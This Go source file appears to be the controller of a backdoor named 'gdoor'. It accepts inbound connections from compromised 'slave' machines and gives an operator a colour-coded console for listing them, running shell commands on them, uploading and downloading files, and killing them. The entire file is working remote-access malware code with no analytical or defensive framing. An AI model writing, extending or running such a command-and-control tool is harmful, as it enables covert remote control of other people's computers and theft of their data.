package main

import(
  "net"
  "fmt"
  "bufio"
  "os"
  "io"
  "strings"

  "./config"
  "./socket"
  "./crypto"

  "github.com/fatih/color"
)

var socks = make(map[string]socket.Socket)

func connHandler(token string, sock socket.Socket){
  reader := bufio.NewReader(os.Stdin)

  for true {
    fmt.Printf("%s%s%s%s",
      color.HiYellowString(token),
      color.HiWhiteString("@"),
      color.HiMagentaString(strings.Split(sock.RemoteAddr().String(), ":")[0]),
      color.HiWhiteString("$ "))

    input, _ := reader.ReadString('\n')
    input = strings.TrimSpace(input)

    switch strings.Split(input, " ")[0] {
    case "help":
      fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("help"), "Show this help message.")
      fmt.Printf("\t%s\t%s\n", color.HiBlueString("shell $cmd"), "Execute shell command.")
      fmt.Printf("\t%s\t%s\n", color.HiBlueString("push $file"), "Send file to slave.")
      fmt.Printf("\t%s\t%s\n", color.HiBlueString("pull $file"), "Receive file from slave.")
      fmt.Printf("\t%s\t%s\n", color.HiBlueString("shutdown"), "Kill the slave.")
      fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("quit"), "Detach this slave.")
      continue

    case "quit":
      return

    case "":
      continue

    case "push":
      sock.Write(input)
      cmds := strings.Split(input, "push")
      cmds[1] = strings.TrimSpace(cmds[1])

      ftoken, _ := sock.Read()
      socks[ftoken].SendFile(cmds[1])
      socks[ftoken].Close()
      delete(socks, ftoken)

    case "pull":
      sock.Write(input)
      cmds := strings.Split(input, "pull")
      cmds[1] = strings.TrimSpace(cmds[1])

      ftoken, _ := sock.Read()
      socks[ftoken].RecvFile(cmds[1])
      socks[ftoken].Close()
      delete(socks, ftoken)

    default:
      sock.Write(input)
    }

    resp, err := sock.Read()
    if err == io.EOF {
      sock.Close()
      delete(socks, token)
      return
    }

    fmt.Println(strings.TrimRight(resp, "\n"))
  }

  return
}

func main(){
  color.Yellow("           _                  ")
  color.Yellow("  __ _  __| | ___   ___  _ __ ")
  color.Yellow(" / _` |/ _` |/ _ \\ / _ \\| '__|")
  color.Yellow("| (_| | (_| | (_) | (_) | |")
  color.Yellow(" \\__, |\\__,_|\\___/ \\___/|_|   ")
  color.Yellow(" |___/                        ")
  color.Yellow("")

  // start server
  server, err := net.Listen("tcp", config.ServerPort)
  if err != nil {
    color.HiRed("Fail to start server, %s", err)
    return
  }

  // listen
  go func(){
    for {
      conn, err := server.Accept()
      if err != nil {
        color.HiRed("Fail to connect, %s", err)
        break
      }

      if(conn != nil){
        for {
          token := crypto.RandStringBytesMaskImprSrc(8)
          if _, exist := socks[token]; !exist {
            sock := socket.Init(conn, config.Key)
            socks[token] = sock
            sock.Write(token)
            break
          }
        }
      }
    }
  }()

  // control panel
  reader := bufio.NewReader(os.Stdin)

  for {
    fmt.Printf("%s%s ", color.HiGreenString("gdoor"), color.HiWhiteString(">"));

    var command, reqToken string

    command, _ = reader.ReadString('\n')
    command = strings.TrimSpace(command)
    switch strings.Split(command, " ")[0] {
    case "help":
      fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("help"), "Show this help message.")
      fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("ls"), "List all slaves.")
      fmt.Printf("\t%s\t%s\n", color.HiBlueString("c $token"), "Connect to specified slave.")
      fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("exit"), "Exit.")

    case "ls":
      for k, v := range socks {
        fmt.Printf("%s %v\n", color.CyanString(k), v.RemoteAddr())
      }

    case "c":
      commands := strings.Split(command, " ")
      if len(commands) < 2 {
        color.HiRed("Too few arguments.")
      }else{
        reqToken = commands[1]
        if sock, exist := socks[reqToken]; exist {
          connHandler(reqToken, sock)
        }else{
          color.HiRed("No such token.")
        }
      }

    case "exit":
      for _, v := range socks {
        v.Close()
      }
      return

    default:
      color.HiRed("No such comand.")
    }
  }
}

